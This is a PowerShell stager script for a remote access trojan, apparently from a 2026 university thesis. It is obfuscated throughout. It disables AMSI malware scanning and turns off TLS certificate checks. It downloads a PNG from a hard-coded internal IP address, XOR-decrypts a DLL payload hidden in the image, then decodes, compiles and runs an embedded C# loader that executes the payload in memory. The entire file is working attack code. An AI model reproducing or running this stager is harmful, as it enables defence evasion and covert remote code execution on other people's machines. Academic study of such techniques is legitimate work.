# Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
# stager.ps1 — offuscato: scarica stego, estrae e carica DLL in memoria

# ── Runtime init ──────────────────────────────────────────────────────
try {
    $a1="Sys"+"tem.Manage"+"ment.Auto"+"mation."
    $a2=$a1+(-join([char[]](65,109,115,105,85,116,105,108,115)))
    $w1=[Ref].Assembly.GetType($a2)
    if($w1){
        $a3=(-join([char[]](97,109,115,105,67,111,110,116,101,120,116)))
        $w2=$w1.GetField($a3,40)
        if($w2){$w2.SetValue($null,[IntPtr]::Zero)}
    }
} catch {}

# ── TLS + download ────────────────────────────────────────────────────
& {
    $sp=[Net.ServicePointManager]
    $sp::ServerCertificateValidationCallback={$true}
    $sp::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
}

$d9=New-Object (-join([char[]](78,101,116,46,87,101,98,67,108,105,101,110,116)))

# ── Download stego image ─────────────────────────────────────────────
$u7=(-join([char[]](104,116,116,112,115,58,47,47,49,57,50,46,49,54,56,46,52,50,46,49,50,52,47,108,111,103,111,95,117,110,105,115,97,46,112,110,103)))
$q3=$d9.DownloadData($u7)

# ── Estrazione payload cifrato ────────────────────────────────────────
$p1=[BitConverter]::ToInt32($q3,$q3.Length-4)
$r8=$q3[$p1..($q3.Length-5)]

# ── XOR decrypt payload ──────────────────────────────────────────────
$x5=[byte[]](0xD6,0x83,0xF9,0xCE,0x3E,0x3D,0x09,0x12,0x15,0xB4,0x22,0xCF,
             0xEF,0x50,0x9F,0x00,0x27,0x98,0x15,0xC0,0xEE,0x74,0x51,0x68,
             0x7C,0x61,0x55,0x99,0xE7,0x43,0xEE,0x28)
for($i=0;$i -lt $r8.Length;$i++){$r8[$i]=$r8[$i] -bxor $x5[$i % $x5.Length]}

# ── Loader (encoded) ──────────────────────────────────────────────────
$ck=[byte[]](0x4B,0x9A,0x37,0xF1,0x62,0xDE,0x8C,0x55,0xA3,0x17,0xC9,0x0E,0x7D,0xB6,0x41,0xE8)
$eb=[Convert]::FromBase64String("PulenwX+3yzQY6xjRrw0myL0UNExp/8hxnrnXAjYNYEm/xm4DKrpJ8xnmmsPwCiLLukM+xet5TvEN5p3DsIkhWXOUokW5YYl1nWlZx6WIoQq6UTRN67obdE3sgRdlmHIEN5bnSuz/DrRY+EsFtMzhi72BMNA99F10GOoehTVYY0z7lKDDP7FO9dHvXxd8SScBvVThA67xDTNc6VrPJ4ynDnzWZZCsKVuqTfpLl3tBYQn01qBDaz4fYF8rHwT0y3bebgerEKt+DTXfqouGM41jTn0F7gMqtwh0TeOawnmM4co21OVELv/Jotep3otwjPII7ZEhRC34jKDeeA1d5ZhyGvBYp8Pv+I0xHKtSAjYIpwi9VmhDbfiIcZl4U0c2i2BJf10ngyo6TvXfqZgU+U1jAj7W51Lg4Z1gzfpahjaJI8q7lLRK7D4Bddl6Wor92mhJe5nhRD+7Xn2Xqd6LcIzyDi2QpgMqqwhj2KgYAmWMcFwkBfRQv7XAM16qGAc0SSMDe9Zkha34zvzeKBgCdMzwAj7W50LsOsWzHm/axPCKIcltGSFBp3tOc8+lARdlmHIL/9blAW/+DCDdaZhEZYlvg2yfp8Wjvgng3blWzTYNbg/6BeCTqvlO9c3vSdGvGHIa7pspAyz7TvCcKxqO8Mviz/zWJ8yseU713K7Jj7XLYQi9FCyDbD6MM1joGETmBKcL9lWnQ730V+DN+kuGdMtjSz7Q5RCl+Ih82O7LhnkDcAC9EOhFqysN4oswy5dlmGbP/tDmAH+5TvXN5t4T/knwCnjQ5Q5g6wnj36nel3EN4ln81mFQq3jecp5vS4Tnzria7oX0UL+rHXFeLsmFNg1yCKnB8oL4uJuyjziJwbfL5xr+AqCDfXlf5cn8mcTwmGeKqd1mBad4zvVcrt6GMRvvCTTWYVR7KQnj3XiP0+feuJruhfRQv6sdcp5vS4PxXyqIu50ngyo6SfXcrsgKdkIhj+pBdkQ8u5+kiHgNRTYNcg59QqzC6rPOs1hrHwJ0zPGH/V+nxbtvn3RO6slT4Zo00G6F9FC/qx1g36vJg/AINZ27FbXRKz6NJ9hqCUPxWiaLu5Cgwz+/jqIP7t4HJs3iWKhSoMHqvknzTfkP0bLS8hruheCFr/4PMA3oGAJlg2HKMh72QCn+DD4Sul8VM1LyGu6F9FC/qw8xT+7IDHTL48/8gvHVvf+MNdiu2Bdm3DTIvRD0Q647Wjhfr1NEtg3jTnuUoNMiuMczWP6PFXEbdgzqXTYWdSsdYM36S5dliiOY/ZRkEnsumGdZedCGNgmnCOzRZQWq/47gzr4NRTQaZoQ9lGQP/+xcvMwtXIP7S2OKrEGrEPjqxCEPrtrCcMzhmu3Bspo/qx1gzfpLl3fL5xr9ETMILf4Fsx5v2sPwiSaZc5YpCuw+GSVP7siEdAgw32zDJgMqqwmzCX0TBTCAocl7FKDFrv+e/d4nEcTwnDeY+gbnQS/p2eTPvIEXZZhyGu6F9ELuKQXymOKYRPAJJo//0XfNrHZHM1j+DhVxG2ELfscw1b3rWiTb/s+P58zjT/vRZ9C871uqTfpLl2WYchr81mFQrveA+Iqi2cJ9S6GPf9FhQesogHMXqd6ToRpmmf2UZBJ7Lh+kib7J0bfJ8AuyGGwX+O8fNFyvXsP2GHFeqE90UL+rHWDN+lnE8JhmwT8UcwOuO1+kSPifRKEeoEl7heULbjqaPFh+0EbnjPELshhsE6twzPFO6d9VI0ojmP/eJcE4rx80XK9ew/YYcV6oT3RQv6sdYM36WcTwmGGBad1mBad4zvVcrt6GMRvvCTTWYVR7KQnj3KGaBudc9xioT3RQv6sdYM36WcTwmGGBKdlh1CR6n3RO4tnCfUuhj3/RYUHrKIBzF6nek6EaZpn/3iXBPW/Z4o7ukEb0G2GOLMM+0L+rHWDN+kuFNg1yCTVCqMU7MMzi2XlTBTCAocl7FKDFrv+e/d4gGAJhXPAObZSvgS4p2aVPuV9MtAnxCXpHspo/qx1gzfpLl3fL5xr/HjMMKi+GsU/uyI/3zWrJPRBlBCq6SeNQ6ZHE8Jy2mPoG5QtuOp+kS/gIg75J45n9ETYWdSsdYM36S5dliiOY/R4zVKi8DrsK/lyAdAO1HuzRZQWq/47gzr4NXeWYchruhfRQq34J8p5ri4J0TXVachSlw67rn6BdL1nC9Njw2nWWJAG/Kd3xmXrNXeWYchruhfRQrjjJ4t+p3pd33zYcPMLnyzl5X6IPrIEXZZhyGu6F9FC/qx1ynm9Lg2LE5551VHZEPLOPNdUpmAL0zOcLugZpQ2X4iGQJeF8UdgOwyKwA9hOrcMzxTunfVSNS8hruhfRQv6sdYM36WcbnjHUe7NUngyq5TvWcvJnE8JhjXbqDIYKt+Awi3L1fFP6JIYs7l/XRKzXMP429D5U02rDcJAX0UL+rHWDN+kuXZYojmPfWZINuuU7xDmIXT7/CMYM/0OiFqzlO8Q/uyINmiTFO7MKzBa5+HzYHekuXZZhyGu6F9FC/qx1gzegYAmWLpovp3WYFp3jO9Vyu3oYxG+8JM9+nxbvun3RO6ZBVt9r2mKhPdFC/qx1gzfpLl2WYchruheDB6r5J803m3hP+SfAObZ1mBad4zvVcrt6GMRvvCTTWYVR7KQnj3GGJRLEJcJ/sxuCLbjqec1k4DUAy0vIa7oX0UL+rCfGY7x8E5Zs2XDnPdFC/qwl1nWlZx6WMpwq7l6SQrzjOs83jHYY1WmKMu5Sqj/+6DnPPrIEXZZhyGu6F9ErsPgF12XpZU6EfK8u7nqeBqvgMOt2p2oR0wDAafFSgwy74GaRNeA1d5ZhyGu6F9FCqO0ng3G5WDyLBo0/ykWeAZ/oMdFyun1V3XLaZ7hhmBCqrn6BYqhiX51jqSe4HNMOse93iizDLl2WYchruheHA6ysM9NBjzM60zW4OfVUsAa6/jDQZOFlToRtyh3zRYVA9a4gwnvrJV/wM8pguFKUQPe3X4M36S5dlmHIIvwflxKIzWieXqd6LcIzxhH/RZ4eouol9VH0MzTYNbg/6BmrB6zjfNFyvXsP2GGOKvZElFnUrHWDN+kuXZY3iTm6YbBf9ugD4j6Ebw/FKYkntHCUFprpOcZwqHoY8C6aDe9Zkha34zvzeKBgCdMzwC3qYbBOqvUlxnivJhngAMFioT3RQv6sdYM36XgcxGG+DacflTSYpRjCZbpmHNpvry7uc5QOu+s013KPYQ/wNIYo7l6eDI7jPM1jrHxV0DG+DbZDiBK74zOLc59IVJ964mu6F9FC/qx16nm9XgnEYYUu9wqnI/bFO9dHvXxT7CSaJLYfpCuw+AXXZeBqEdpvpC70UIUK8rwtkCf5PlGGOdx7swz7Qv6sdYM36S4U0GmFLvcKzCuw+AXXZedUGMQuwTn/Q4QQsKwzwnu6a0a8YchruhfRQv7BNNFkoW8RmAKHO+MflQ6yoGWPeqxjUdIthGXWUp8FquR8mB3pLl2WYchrul6fFv7jM8UqhWEe5A3AL/Zb2FnUrHWDN+kuXZYojmP1UZde7qUu9VHhYxjbbb0C9EOhFqyiD8ZlpiJNznnYe6oeyhC7+CDReeloHNoyjXDnPdFC/qx1gzfpeBzEYZonpx+VMJKlGMJlumYc2m+vLu5zlA676zTXco9hD/A0hijuXp4MjuM8zWOsfFW8YchruhfRQv6sdYM3p2sKlgiGP8pDg0qz6TiNQ6ZHE8J33GOzHJ4EuKV51265axLQaYwZ1h7YWdSsdYM36S5dljONP+9Fn0Ks4H3OcqQnU+IuoSXuAcVK97Jok2/4Pk2GcdM2kEo=")

# ── XOR decode C# source ─────────────────────────────────────────────
for($i=0;$i -lt $eb.Length;$i++){$eb[$i]=$eb[$i] -bxor $ck[$i % $ck.Length]}
$cs=[Text.Encoding]::UTF8.GetString($eb)

# ── Compila ed esegui ─────────────────────────────────────────────────
Add-Type -TypeDefinition $cs
[Upd8r]::Exec($r8)|Out-Null

# ── Keep alive ────────────────────────────────────────────────────────
while($true){Start-Sleep 3600}
